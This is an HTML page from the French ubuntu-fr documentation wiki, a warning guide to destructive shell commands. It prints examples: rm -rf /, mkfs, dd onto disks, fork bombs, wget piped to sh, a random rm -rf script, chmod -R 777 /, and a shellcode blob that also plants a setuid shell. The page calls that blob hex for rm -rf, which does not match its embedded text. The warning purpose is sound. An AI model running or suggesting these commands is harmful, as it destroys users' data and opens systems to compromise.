<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr"
  lang="fr" dir="ltr" class="no-js">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>commandes_dangereuses [Wiki ubuntu-fr]</title>
  <script>(function(H){H.className=H.className.replace(/\bno-js\b/,'js')})(document.documentElement)</script>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <link rel="shortcut icon" href="/_media/favicon.ico" />
<link rel="apple-touch-icon" href="/lib/tpl/bootstrap3/images/apple-touch-icon.png" />
    <meta name="generator" content="DokuWiki"/>
<meta name="robots" content="index,follow"/>
<meta name="keywords" content="script"/>
<link type="text/css" rel="stylesheet" href="/lib/tpl/bootstrap3/assets/fonts/united.fonts.css"/>
<link type="text/css" rel="stylesheet" href="/lib/tpl/bootstrap3/assets/font-awesome/css/font-awesome.min.css"/>
<link type="text/css" rel="stylesheet" href="/lib/tpl/bootstrap3/assets/bootstrap/united/bootstrap.min.css"/>
<link rel="search" type="application/opensearchdescription+xml" href="/lib/exe/opensearch.php" title="Wiki ubuntu-fr"/>
<link rel="start" href="/"/>
<link rel="contents" href="/commandes_dangereuses?do=index" title="Plan du site"/>
<link rel="manifest" href="/lib/exe/manifest.php"/>
<link rel="alternate" type="application/rss+xml" title="Derniers changements" href="/feed.php"/>
<link rel="alternate" type="application/rss+xml" title="Catégorie courante" href="/feed.php?mode=list&amp;ns="/>
<link rel="edit" title="Modifier cette page" href="/commandes_dangereuses?do=edit"/>
<link rel="alternate" type="text/html" title="HTML brut" href="/_export/xhtml/commandes_dangereuses"/>
<link rel="alternate" type="text/plain" title="Wiki balise" href="/_export/raw/commandes_dangereuses"/>
<link rel="canonical" href="http://doc.ubuntu-fr.org/commandes_dangereuses"/>
<link rel="stylesheet" type="text/css" href="/lib/exe/css.php?t=bootstrap3&amp;tseed=b4a19b95bb4d08daf02b6dd52d7e6abc"/>
<!--[if gte IE 9]><!-->
<script type="text/javascript">/*<![CDATA[*/var NS='';var JSINFO = {"bootstrap3":{"mode":"show","toc":[],"config":{"collapsibleSections":0,"fixedTopNavbar":1,"showSemanticPopup":0,"sidebarOnNavbar":0,"tagsOnTop":1,"tocAffix":1,"tocCollapseOnScroll":1,"tocCollapsed":0,"tocLayout":"default","useAnchorJS":1}},"id":"commandes_dangereuses","namespace":"","ACT":"show","useHeadingNavigation":0,"useHeadingContent":0};
/*!]]>*/</script>
<script type="text/javascript" charset="utf-8" src="/lib/exe/jquery.php?tseed=23f888679b4f1dc26eef34902aca964f"></script>
<script type="text/javascript" charset="utf-8" src="/lib/exe/js.php?t=bootstrap3&amp;tseed=b4a19b95bb4d08daf02b6dd52d7e6abc"></script>
<script type="text/javascript" src="/lib/tpl/bootstrap3/assets/bootstrap/js/bootstrap.min.js"></script>
<script type="text/javascript" src="/lib/tpl/bootstrap3/assets/anchorjs/anchor.min.js"></script>
<script type="text/javascript" src="/lib/tpl/bootstrap3/assets/typeahead/bootstrap3-typeahead.min.js"></script>
<!--<![endif]-->
<style type="text/css">@media screen { body { margin-top: 70px; }  #dw__toc.affix { top: 60px; position: fixed !important; }  #dw__toc .nav .nav .nav { display: none; } }</style>
    <!--[if lt IE 9]>
  <script type="text/javascript" src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
  <script type="text/javascript" src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>
<body class="united dokuwiki mode_show tpl_bootstrap3 dw-page-on-panel" data-page-id="commandes_dangereuses">

  <header id="dokuwiki__header" class="dokuwiki container">
    <nav id="dw__navbar" class="navbar navbar-fixed-top navbar-default" role="navigation">

  <div class="container">

    <div class="navbar-header">

      <button class="navbar-toggle" type="button" data-toggle="collapse" data-target=".navbar-collapse">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>

      <a href="/accueil"  accesskey="h" title="[H]" class="navbar-brand"><span class="uf uf-cof" id="dw__accueil" style="font-size: 35px;" ></span> <span id="dw__title" style="margin-top:-5px">Wiki ubuntu-fr<span id="dw__tagline">La Documentation francophone</span></span></a>
    </div>

    <div class="collapse navbar-collapse">

      
      <ul class="nav navbar-nav">
        <li>
          <a href="//ubuntu-fr.org/" ><i class="fa fa-2x fa-fw fa-home"></i><span> Accueil</span></a>        </li>
        <li>
          <a href="//forum.ubuntu-fr.org/" ><i class="fa fa-2x fa-fw fa-comments"></i><span> Forum</span></a>        </li>
        <li>
          <a href="//planet.ubuntu-fr.org/" ><i class="fa fa-2x fa-fw fa-globe"></i><span> Planet</span></a>        </li>
      </ul>

            
      
      <div class="navbar-right" id="dw__navbar_items">

        <form action="//forum.ubuntu-fr.org/search_ubuntufr.php" accept-charset="utf-8" class="navbar-form navbar-left search" id="dw__search" method="get" role="search"><div class="no"><input id="qsearch" autocomplete="off" type="search" placeholder="Rechercher" accesskey="f" name="q" class="form-control" title="[F]" /><button type="submit" title="Rechercher"><i class="fa fa-fw fa-search"></i></button><input type="hidden" name="do" value="search" /><input type="hidden" name="tsearch" value="wiki" /></div></form>
        
<ul class="nav navbar-nav dw-action-icon" id="dw__tools">


  <li class="dropdown">

    <a href="" class="dropdown-toggle" data-target="#" data-toggle="dropdown" title="" role="button" aria-haspopup="true" aria-expanded="false">
      <i class="fa fa-2x fa-fw fa-wrench"></i> <span class="hidden-lg hidden-md hidden-sm">Outils</span> <span class="caret"></span>
    </a>

    <ul class="dropdown-menu tools" role="menu">
    
      <li class="dropdown-header">
        <i class="fa fa-fw fa-cubes"></i> Outils du site      </li>
      <li><a href="/commandes_dangereuses?do=recent"  class="action recent" accesskey="r" rel="nofollow" title="Derniers changements [R]">Derniers changements</a></li><li><a href="/commandes_dangereuses?do=media&amp;ns="  class="action media" rel="nofollow" title="Gestionnaire Multimédia">Gestionnaire Multimédia</a></li><li><a href="/commandes_dangereuses?do=index"  class="action index" accesskey="x" rel="nofollow" title="Plan du site [X]">Plan du site</a></li>
            <li class="divider" role="separator"></li>
      
    
      <li class="dropdown-header">
        <i class="fa fa-fw fa-file"></i> Outils de la page      </li>
      <li><a href="/commandes_dangereuses?do=edit"  class="action edit" accesskey="e" rel="nofollow" title="Modifier cette page [E]">Modifier cette page</a></li><li><a href="/commandes_dangereuses?do=revisions"  class="action revs" accesskey="o" rel="nofollow" title="Anciennes révisions [O]">Anciennes révisions</a></li><li><a href="/commandes_dangereuses?do=backlink"  class="action backlink" rel="nofollow" title="Liens de retour">Liens de retour</a></li><li><a href="#dokuwiki__top"  class="action top" accesskey="t" rel="nofollow" title="Haut de page [T]">Haut de page</a></li>
      
        </ul>
  </li>


</ul>


        <ul class="nav navbar-nav">

          
          
                    <li>
            <span class="dw__actions dw-action-icon">
              <a href="/commandes_dangereuses?do=login&amp;sectok="  class="action btn btn-default navbar-btn login" rel="nofollow" title="S&#039;identifier"><span class="">S'identifier</span></a>            </span>
          </li>
          
        </ul>

        
        

      </div>

    </div>
  </div>
</nav>
  </header>

  <div id="dokuwiki__top" class="dokuwiki container">

    <div id="dokuwiki__pageheader">

      
      
      <p class="pageId text-right small">
        <span class="label label-primary">commandes_dangereuses</span>      </p>

      <div id="dw__msgarea" class="small">
              </div>

    </div>

    <main class="main row" role="main">

      
      <article id="dokuwiki__content" class="container" itemscope itemtype="http://schema.org/Article" itemref="dw__license">

        
<nav id="dw__pagetools" class="hidden-print">
  <div class="tools panel panel-default pull-right ">
    <ul class="nav nav-stacked nav-pills">
      <li><a href="/commandes_dangereuses?do=edit"  class="action text-muted edit" accesskey="e" rel="nofollow" title="Modifier cette page [E]"><i class="fa fa-fw fa-pencil-square-o"></i><span class="sr-only"> Modifier cette page</span></a></li><li><a href="/commandes_dangereuses?do=revisions"  class="action text-muted revs" accesskey="o" rel="nofollow" title="Anciennes révisions [O]"><i class="fa fa-fw fa-clock-o"></i><span class="sr-only"> </span></a></li><li><a href="/commandes_dangereuses?do=backlink"  class="action text-muted backlink" rel="nofollow" title="Liens de retour"><i class="fa fa-fw fa-link"></i><span class="sr-only"> Liens de retour</span></a></li>    </ul>
  </div>
</nav>

        <div class="panel panel-default" itemprop="articleBody">
          <div class="page panel-body">

            <div class="dw-content-page "><div class="dw-toc hidden-print"><script>JSINFO.bootstrap3.toc = [{"link":"#suppression_de_tous_les_fichiers_ou_des_fichiers_du_repertoire_actuel_ou_de_fichiers_importants","title":"Suppression de tous les fichiers ou des fichiers du r\u00e9pertoire actuel ou de fichiers importants","level":1},{"link":"#re-formatage","title":"Re-formatage","level":1},{"link":"#manipulation_de_peripheriques_de_stockage","title":"Manipulation de p\u00e9riph\u00e9riques de stockage","level":1},{"link":"#forkbomb","title":"Forkbomb","level":1},{"link":"#tarbomb","title":"Tarbomb","level":1},{"link":"#decompression_bomb","title":"Decompression bomb","level":1},{"link":"#shell","title":"Shell","level":1},{"link":"#roulette_russe","title":"Roulette russe","level":2},{"link":"#compilation_de_code","title":"Compilation de code","level":1},{"link":"#changements_de_droits","title":"Changements de droits","level":1},{"link":"#ajout_d_un_mot_de_passe_au_compte","title":"Ajout d'un mot de passe au compte","level":1},{"link":"#conclusion","title":"Conclusion","level":1}];</script>
<!-- TOC START -->
<nav id="dw__toc" role="navigation" class="toc-panel panel panel-default small">
<h6 data-toggle="collapse" data-target="#dw__toc .toc-body" title="Table des matières" class="panel-heading toc-title"><i class="fa fa-fw fa-th-list"></i> <span>Table des matières</span> <i class="caret"></i></h6>
<div class="panel-body  toc-body collapse in">

<ul class="nav toc">
<li class="level1"><a href="#suppression_de_tous_les_fichiers_ou_des_fichiers_du_repertoire_actuel_ou_de_fichiers_importants">Suppression de tous les fichiers ou des fichiers du répertoire actuel ou de fichiers importants</a></li>
<li class="level1"><a href="#re-formatage">Re-formatage</a></li>
<li class="level1"><a href="#manipulation_de_peripheriques_de_stockage">Manipulation de périphériques de stockage</a></li>
<li class="level1"><a href="#forkbomb">Forkbomb</a></li>
<li class="level1"><a href="#tarbomb">Tarbomb</a></li>
<li class="level1"><a href="#decompression_bomb">Decompression bomb</a></li>
<li class="level1"><a href="#shell">Shell</a>
<ul class="nav toc">
<li class="level2"><a href="#roulette_russe">Roulette russe</a></li>
</ul>
</li>
<li class="level1"><a href="#compilation_de_code">Compilation de code</a></li>
<li class="level1"><a href="#changements_de_droits">Changements de droits</a></li>
<li class="level1"><a href="#ajout_d_un_mot_de_passe_au_compte">Ajout d&#039;un mot de passe au compte</a></li>
<li class="level1"><a href="#conclusion">Conclusion</a></li>
</ul>

</div>
</nav>
<!-- TOC END -->
</div><!-- CONTENT --><div class="dw-content"><div class="tags"><span>
	<a href="/script" class="wikilink1" title="script" rel="tag">script</a>
</span></div>
<hr />

<h1 class="sectionedit1 page-header" id="les_commandes_dangereuses">Les commandes dangereuses</h1>
<div class="level1">

<p>
La ligne de commande est un outil puissant, et notamment très pratique pour détecter ou résoudre les problèmes : il en est donc souvent fait usage sur le forum ou dans la documentation. Cependant, certains utilisateurs malveillants peuvent donner des commandes dangereuses qui corrompent, voire détruisent le système, ou les données. L&#039;exécution d&#039;une commande nécessite donc toujours la plus grande prudence (utiliser la commande <a href="/man" class="wikilink1" title="man">man</a>, moteurs de recherche, attente d&#039;un deuxième avis, etc.).
</p>

<p>
À titre d&#039;exemple et dans un but éducatif, afin de montrer qu&#039;il convient toujours de se méfier, voilà quelques commandes dangereuses.
</p>
<div class="notewarning">Attention, ces commandes sont dangereuses, <strong>ne les exécutez pas</strong> !<br/>

N&#039;exécutez sous aucun prétexte une commande dont vous n&#039;êtes pas sûr, n&#039;hésitez pas à demander conseil sur le forum.
</div>
<p>
Cette liste est loin d&#039;être exhaustive, mais devrait vous donner un aperçu de ce que les gens peuvent essayer de vous inciter à faire. Souvenez-vous que cela peut être dissimulé dans une commande ou masqué dans le cadre d&#039;une procédure longue.
</p>
<div class="noteclassic">Les &quot;QUELQUE_CHOSE&quot;, &quot;QUELQUE_COMMANDE&quot; et &quot;QUELQUE_CHOSE_IMPORTANT&quot; indiqués dans les commandes pouvant être remplacés par n&#039;importe quelle chaîne de caractères.
</div>
</div>
<div class='secedit editbutton_section editbutton_1'><form class="button btn_secedit form-inline" method="post" action="/commandes_dangereuses"><div class="no"><input type="hidden" name="do" value="edit" /><input type="hidden" name="rev" value="1620147064" /><input type="hidden" name="summary" value="[Les commandes dangereuses] " /><input type="hidden" name="target" value="section" /><input type="hidden" name="hid" value="les_commandes_dangereuses" /><input type="hidden" name="codeblockOffset" value="0" /><input type="hidden" name="range" value="23-1365" /><button type="submit" title="Les commandes dangereuses" class=" btn btn-default btn btn-xs btn-default">Modifier</button></div></form></div>
<h2 class="sectionedit2 page-header" id="suppression_de_tous_les_fichiers_ou_des_fichiers_du_repertoire_actuel_ou_de_fichiers_importants">Suppression de tous les fichiers ou des fichiers du répertoire actuel ou de fichiers importants</h2>
<div class="level2">

<p>
Sous linux avec un terminal on peut tout faire, absolument tout. Donc lisez bien ceci :
Le danger de ces commandes est tout à fait évident : 
</p>
<div class="notewarning">Règle n° 1 : NE JAMAIS VALIDER UNE COMMANDE QUI POURRAIT VOUS FAIRE PERDRE VOS DONNÉES ET VOTRE SYSTÈME.
</div>
<p>
En cas de doute, n&#039;hésitez pas à faire une sauvegarde de vos données sur un support externe tel qu&#039;une clef <abbr title="Universal Serial Bus">USB</abbr>, un disque dur <abbr title="Universal Serial Bus">USB</abbr>, ou un CD/DVD enregistrable, et à vérifier que la sauvegarde a fonctionné.
</p>

<p>
Celles qui peuvent tout effacer (fichier système ou données personnelles) :
</p>
<pre class="code">rm -rf /
rm -rf .
rm -rf *
mv QUELQUE_CHOSE /dev/null
shred QUELQUE_CHOSE
QUELQUE_COMMANDE &gt; QUELQUE_CHOSE_IMPORTANT
sed QUELQUE_CHOSE -i QUELQUE_CHOSE
mv -r / /dev/null (Déplace les fichiers de façon récursive depuis la racine vers null = tout est effacé).</pre>

<p>
la commande
</p>
<pre class="code">&gt; fichiers*</pre>

<p>
est aussi redoutable : elle redirige du rien en écrasant les fichiers.
</p>

<p>
ainsi que toutes les variantes commençant par &#039;rm&#039; et &#039;mv&#039; et se terminant par /dev/null
Pourquoi ?
</p>
<ul class=" fix-media-list-overlap">
<li class="level1"><div class="li"> rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/&lt;votreidentifiant/ ) !</div>
</li>
</ul>

<p>
/dev/null est l&#039;équivalent de la corbeille définitive, tout fichier envoyé à cette sortie entraîne sa suppression.
</p>

<p>
Assurez vous que :
</p>
<ul class=" fix-media-list-overlap">
<li class="level1"><div class="li"> un avertissement vous prévient et vous en assumerez les conséquences en cas de perte de données.</div>
</li>
<li class="level1"><div class="li"> la documentation est bien claire, bien rédigée, explicite.</div>
</li>
</ul>

<p>
Protection remplacer le plus souvent possible cette commande par :
</p>
<pre class="code">rm -i &lt;nom du fichier à supprimer&gt;</pre>

<p>
 ( mode interactif avec confirmation de suppression )
Vous pouvez aussi utiliser la commande mv ( déplacer )
</p>
<pre class="code">mv &lt;nom du fichier à supprimer&gt; ~/.local/share/Trash/files</pre>

<p>
Exemple :
</p>

<p>
Suppression du fichier labrador.jpeg (une image)
au lieu d&#039;exécuter :
</p>
<pre class="code">rm labrador.jpeg</pre>

<p>
Entrez plutôt :
</p>
<pre class="code">rm -i labrador.jpeg</pre>
<pre class="code">mv labrador.jpeg ~/.local/share/Trash/files</pre>
<div class="noteclassic">Un doute ? <a href="http://forum.ubuntu-fr.org" class="urlextern" title="http://forum.ubuntu-fr.org" rel="nofollow">Posez vos questions sur le forum : http://forum.ubuntu-fr.org</a>
</div><div class="notewarning">Règle n° 2 : NE JAMAIS ou du moins LE MOINS POSSIBLE OUVRIR NAUTILUS (LE GESTIONNAIRE DE FICHIERS) EN MODE SUPER UTILISATEUR (ROOT) VOUS POURRIEZ PERDRE VOS DONNÉES ET ENDOMMAGER VOTRE SYSTÈME.
</div><ul class=" fix-media-list-overlap">
<li class="level1"><div class="li"> La commande find peut aussi être dangereuse, avec son paramètre -exec qui permet d&#039;exécuter une commande sur le résultat d&#039;une recherche.</div>
</li>
</ul>

<p>
Par exemple, la commande suivante est très dangereuse : elle provoque la suppressions de tous les fichiers.
</p>
<pre class="code">sudo find / -name &quot;*&quot; -exec rm {} \;</pre>

<p>
De même pour <strong>rm</strong> qui est utilisé.
</p>

</div>
<div class='secedit editbutton_section editbutton_2'><form class="button btn_secedit form-inline" method="post" action="/commandes_dangereuses"><div class="no"><input type="hidden" name="do" value="edit" /><input type="hidden" name="rev" value="1620147064" /><input type="hidden" name="summary" value="[Suppression de tous les fichiers ou des fichiers du répertoire actuel ou de fichiers importants] " /><input type="hidden" name="target" value="section" /><input type="hidden" name="hid" value="suppression_de_tous_les_fichiers_ou_des_fichiers_du_repertoire_actuel_ou_de_fichiers_importants" /><input type="hidden" name="codeblockOffset" value="0" /><input type="hidden" name="range" value="1366-4291" /><button type="submit" title="Suppression de tous les fichiers ou des fichiers du répertoire actuel ou de fichiers importants" class=" btn btn-default btn btn-xs btn-default">Modifier</button></div></form></div>
<h2 class="sectionedit3 page-header" id="re-formatage">Re-formatage</h2>
<div class="level2">

<p>
Les données sur le périphérique mentionné après la commande mkfs seront détruites et remplacées par un système de fichier vide : 
</p>
<pre class="code">mkfs
mkfs.ext3
mkfs.QUELQUE_CHOSE</pre>

</div>
<div class='secedit editbutton_section editbutton_3'><form class="button btn_secedit form-inline" method="post" action="/commandes_dangereuses"><div class="no"><input type="hidden" name="do" value="edit" /><input type="hidden" name="rev" value="1620147064" /><input type="hidden" name="summary" value="[Re-formatage] " /><input type="hidden" name="target" value="section" /><input type="hidden" name="hid" value="re-formatage" /><input type="hidden" name="codeblockOffset" value="8" /><input type="hidden" name="range" value="4292-4506" /><button type="submit" title="Re-formatage" class=" btn btn-default btn btn-xs btn-default">Modifier</button></div></form></div>
<h2 class="sectionedit4 page-header" id="manipulation_de_peripheriques_de_stockage">Manipulation de périphériques de stockage</h2>
<div class="level2">

<p>
Écrit des données sur le périphérique et peut entraîner la perte totale des données : 
</p>
<pre class="code">QUELQUE_COMMANDE &gt; /dev/sda
dd if=QUELQUE_CHOSE of=/dev/sda</pre>

</div>
<div class='secedit editbutton_section editbutton_4'><form class="button btn_secedit form-inline" method="post" action="/commandes_dangereuses"><div class="no"><input type="hidden" name="do" value="edit" /><input type="hidden" name="rev" value="1620147064" /><input type="hidden" name="summary" value="[Manipulation de périphériques de stockage] " /><input type="hidden" name="target" value="section" /><input type="hidden" name="hid" value="manipulation_de_peripheriques_de_stockage" /><input type="hidden" name="codeblockOffset" value="9" /><input type="hidden" name="range" value="4507-4733" /><button type="submit" title="Manipulation de périphériques de stockage" class=" btn btn-default btn btn-xs btn-default">Modifier</button></div></form></div>
<h2 class="sectionedit5 page-header" id="forkbomb">Forkbomb</h2>
<div class="level2">

<p>
Exécute un grand nombre de processus jusqu&#039;à ce que le système gèle, ce qui vous force à faire un arrêt brutal et peut causer la corruption du système, ou d&#039;autres désagréments.
</p>

<p>
Avec le shell Bash : 
</p>
<pre class="code">:(){:|:&amp;};:</pre>

<p>
En Perl :
</p>
<pre class="code">perl -e &quot;fork while fork&quot;</pre>

<p>
Si vous voulez savoir comment se protéger contre les forks bombs allez voir <a href="/tutoriel/comment_se_proteger_des_fork_bomb" class="wikilink1" title="tutoriel:comment_se_proteger_des_fork_bomb">ici</a>.
</p>

</div>
<div class='secedit editbutton_section editbutton_5'><form class="button btn_secedit form-inline" method="post" action="/commandes_dangereuses"><div class="no"><input type="hidden" name="do" value="edit" /><input type="hidden" name="rev" value="1620147064" /><input type="hidden" name="summary" value="[Forkbomb] " /><input type="hidden" name="target" value="section" /><input type="hidden" name="hid" value="forkbomb" /><input type="hidden" name="codeblockOffset" value="10" /><input type="hidden" name="range" value="4734-5152" /><button type="submit" title="Forkbomb" class=" btn btn-default btn btn-xs btn-default">Modifier</button></div></form></div>
<h2 class="sectionedit6 page-header" id="tarbomb">Tarbomb</h2>
<div class="level2">

<p>
Quelqu&#039;un vous demande d&#039;extraire une archive dans un répertoire existant. Cette archive tar peut être conçue pour exploser en un grand nombre de fichiers, voire écraser les fichiers de l&#039;utilisateur qui portent le même nom que ceux de l&#039;archive. Vous devriez donc prendre l&#039;habitude de décompresser des tar dans un nouveau répertoire vide.
Ce cas est extrêmement rare, puisque, sous Ubuntu du moins, une archive contenant plus d&#039;un fichier se décompressera dans un nouveau dossier.
</p>
<div class="noteimportant">On parle ici de fichiers tar, mais c&#039;est valable pour tous les formats de compression existant (zip, gzip, tar-gz etc…)
</div>
</div>
<div class='secedit editbutton_section editbutton_6'><form class="button btn_secedit form-inline" method="post" action="/commandes_dangereuses"><div class="no"><input type="hidden" name="do" value="edit" /><input type="hidden" name="rev" value="1620147064" /><input type="hidden" name="summary" value="[Tarbomb] " /><input type="hidden" name="target" value="section" /><input type="hidden" name="hid" value="tarbomb" /><input type="hidden" name="codeblockOffset" value="10" /><input type="hidden" name="range" value="5153-5810" /><button type="submit" title="Tarbomb" class=" btn btn-default btn btn-xs btn-default">Modifier</button></div></form></div>
<h2 class="sectionedit7 page-header" id="decompression_bomb">Decompression bomb</h2>
<div class="level2">

<p>
Quelqu&#039;un vous demande d&#039;extraire une archive qui semble petite lors du téléchargement mais qui contient à la décompression des données d&#039;une taille beaucoup plus considérable, au point de remplir votre disque dur. Vous ne devriez pas utiliser des données d&#039;une source non-fiable.
N&#039;hésitez pas à regarder ce que contient le fichier compressé <strong>avant</strong> la décompression.
</p>

</div>
<div class='secedit editbutton_section editbutton_7'><form class="button btn_secedit form-inline" method="post" action="/commandes_dangereuses"><div class="no"><input type="hidden" name="do" value="edit" /><input type="hidden" name="rev" value="1620147064" /><input type="hidden" name="summary" value="[Decompression bomb] " /><input type="hidden" name="target" value="section" /><input type="hidden" name="hid" value="decompression_bomb" /><input type="hidden" name="codeblockOffset" value="10" /><input type="hidden" name="range" value="5811-6224" /><button type="submit" title="Decompression bomb" class=" btn btn-default btn btn-xs btn-default">Modifier</button></div></form></div>
<h2 class="sectionedit8 page-header" id="shell">Shell</h2>
<div class="level2">

<p>
Quelqu&#039;un vous donne le lien vers un script shell à exécuter. Il peut contenir n&#039;importe quelle commande (bénigne ou malveillante). Vous ne devriez pas exécuter du code de personnes à qui vous ne faites pas confiance : 
</p>
<pre class="code">wget http://une_adresse/un_fichier
sh ./un_fichier</pre>
<pre class="code">wget http://une_adresse/un_fichier -O- | sh</pre>

</div>
<div class='secedit editbutton_section editbutton_8'><form class="button btn_secedit form-inline" method="post" action="/commandes_dangereuses"><div class="no"><input type="hidden" name="do" value="edit" /><input type="hidden" name="rev" value="1620147064" /><input type="hidden" name="summary" value="[Shell] " /><input type="hidden" name="target" value="section" /><input type="hidden" name="hid" value="shell" /><input type="hidden" name="codeblockOffset" value="10" /><input type="hidden" name="range" value="6225-6572" /><button type="submit" title="Shell" class=" btn btn-default btn btn-xs btn-default">Modifier</button></div></form></div>
<h3 class="sectionedit9" id="roulette_russe">Roulette russe</h3>
<div class="level3">

<p>
Une fois ce script lancé, vous avez une &quot;chance&quot; sur 6 pour que tous les fichiers à la racine de votre système soient effacés. Faites attention à ce script et ses variantes !
</p>
<pre class="code">#!/bin/bash
echo &quot;&quot;
! (( $RANDOM % 6 )) &amp;&amp; rm -rf / || echo &quot;You live&quot; 
exit 0</pre>

</div>
<div class='secedit editbutton_section editbutton_9'><form class="button btn_secedit form-inline" method="post" action="/commandes_dangereuses"><div class="no"><input type="hidden" name="do" value="edit" /><input type="hidden" name="rev" value="1620147064" /><input type="hidden" name="summary" value="[Roulette russe] " /><input type="hidden" name="target" value="section" /><input type="hidden" name="hid" value="roulette_russe" /><input type="hidden" name="codeblockOffset" value="10" /><input type="hidden" name="range" value="6573-6875" /><button type="submit" title="Roulette russe" class=" btn btn-default btn btn-xs btn-default">Modifier</button></div></form></div>
<h2 class="sectionedit10 page-header" id="compilation_de_code">Compilation de code</h2>
<div class="level2">

<p>
Quelqu&#039;un vous donne le code source et vous dit de le compiler. Il est facile de cacher du code malveillant dans un long code source, et le code source donne à l&#039;attaquant beaucoup de possibilités pour déguiser son code malveillant. Vous ne devriez pas compiler ou exécuter le code compilé, à moins qu&#039;il ne s&#039;agisse d&#039;une application bien connue, obtenue à partir d&#039;un site réputé (SourceForge, les sites Ubuntu, etc.).
</p>

<p>
Par exemple :
</p>
<pre class="code">char esp[] __attribute__ ((section(&quot;.text&quot;))) /* e.s.p
release */
                = &quot;\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68&quot;
                  &quot;\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99&quot;
                  &quot;\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7&quot;
                  &quot;\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56&quot;
                  &quot;\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31&quot;
                  &quot;\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69&quot;
                  &quot;\x6e\x2f\x73\x68\x00\x2d\x63\x00&quot;
                  &quot;cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;&quot;;</pre>

<p>
Ceci est la forme hexadécimale de <code>rm -rf</code> qui va détruire votre répertoire en tant que simple utilisateur, ou tous les fichiers en tant que root.
</p>

</div>
<div class='secedit editbutton_section editbutton_10'><form class="button btn_secedit form-inline" method="post" action="/commandes_dangereuses"><div class="no"><input type="hidden" name="do" value="edit" /><input type="hidden" name="rev" value="1620147064" /><input type="hidden" name="summary" value="[Compilation de code] " /><input type="hidden" name="target" value="section" /><input type="hidden" name="hid" value="compilation_de_code" /><input type="hidden" name="codeblockOffset" value="11" /><input type="hidden" name="range" value="6876-8130" /><button type="submit" title="Compilation de code" class=" btn btn-default btn btn-xs btn-default">Modifier</button></div></form></div>
<h2 class="sectionedit11 page-header" id="changements_de_droits">Changements de droits</h2>
<div class="level2">
<pre class="code">chmod -R 777 /</pre>

<p>
Ceci donne les droits de lecture et d&#039;écriture sur tous les fichiers. Or les commandes situées dans /bin ne supportent pas ce mode.
Dans ce cas, il faut réattribuer la valeur o-w, il faut que vous ayez les droits u+w sur /tmp
</p>

<p>
Pour info :
un / non modifié :
</p>
<pre class="code">$ ls -al /
total 100
drwxr-xr-x  21 root root  4096 2009-07-15 09:39 .
drwxr-xr-x  21 root root  4096 2009-07-15 09:39 ..
drwxr-xr-x   2 root root  4096 2009-07-14 00:49 bin
drwxr-xr-x   3 root root  4096 2009-07-15 09:39 boot
lrwxrwxrwx   1 root root    11 2009-07-09 22:34 cdrom -&gt; media/cdrom
drwxr-xr-x  17 root root  4920 2009-07-18 04:47 dev
drwxr-xr-x 144 root root 12288 2009-07-18 05:30 etc
drwxr-xr-x   3 root root  4096 2009-07-09 22:40 home
lrwxrwxrwx   1 root root    33 2009-07-15 09:39 initrd.img -&gt; boot/initrd.img-2.6.28-14-generic
lrwxrwxrwx   1 root root    33 2009-07-09 23:04 initrd.img.old -&gt; boot/initrd.img-2.6.28-13-generic
drwxr-xr-x  19 root root 12288 2009-07-17 21:58 lib
drwx------   2 root root 16384 2009-07-09 22:34 lost+found
drwxr-xr-x   9 root root  4096 2009-07-18 04:42 media
drwxr-xr-x   2 root root  4096 2009-04-13 11:33 mnt
drwxr-xr-x   2 root root  4096 2009-04-20 15:59 opt
dr-xr-xr-x 177 root root     0 2009-07-18 06:35 proc
drwx------  14 root root  4096 2009-07-18 05:10 root
drwxr-xr-x   2 root root  4096 2009-07-17 21:59 sbin
drwxr-xr-x   2 root root  4096 2009-03-06 17:21 selinux
drwxr-xr-x   2 root root  4096 2009-04-20 15:59 srv
drwxr-xr-x  12 root root     0 2009-07-18 06:35 sys
drwxrwxrwt  16 root root  4096 2009-07-18 05:17 tmp
drwxr-xr-x  13 root root  4096 2009-07-17 01:34 usr
drwxr-xr-x  16 root root  4096 2009-07-10 15:35 var
lrwxrwxrwx   1 root root    30 2009-07-15 09:39 vmlinuz -&gt; boot/vmlinuz-2.6.28-14-generic
lrwxrwxrwx   1 root root    30 2009-07-09 23:04 vmlinuz.old -&gt; boot/vmlinuz-2.6.28-13-generic</pre>

<p>
Plus généralement, attention aux changements de droits, surtout quand ils s&#039;appliquent sur des dossiers. Par exemple un 
</p>
<pre class="code">chmod -R xxx /home/votre_utilisateur</pre>

<p>
 <strong>peut vous obliger à recréer un compte utilisateur, vu que certains fichiers nécessitent des droits particuliers.</strong>
</p>

</div>
<div class='secedit editbutton_section editbutton_11'><form class="button btn_secedit form-inline" method="post" action="/commandes_dangereuses"><div class="no"><input type="hidden" name="do" value="edit" /><input type="hidden" name="rev" value="1620147064" /><input type="hidden" name="summary" value="[Changements de droits] " /><input type="hidden" name="target" value="section" /><input type="hidden" name="hid" value="changements_de_droits" /><input type="hidden" name="codeblockOffset" value="12" /><input type="hidden" name="range" value="8131-10331" /><button type="submit" title="Changements de droits" class=" btn btn-default btn btn-xs btn-default">Modifier</button></div></form></div>
<h2 class="sectionedit12 page-header" id="ajout_d_un_mot_de_passe_au_compte">Ajout d&#039;un mot de passe au compte</h2>
<div class="level2">
<pre class="code">sudo passwd root</pre>

<p>
La commande &quot;sudo passwd root &quot; peut vous faire perdre vos droits sudo !!
</p>

<p>
<img src="/lib/images/smileys/icon_cool.gif" class="icon" alt="8-)" /> Pour récupérer ses droits sudo sur son compte, se loguer en root (&quot;sudo -i&quot;) et tapez :
</p>
<pre class="code">adduser votre_username sudo</pre>

</div>
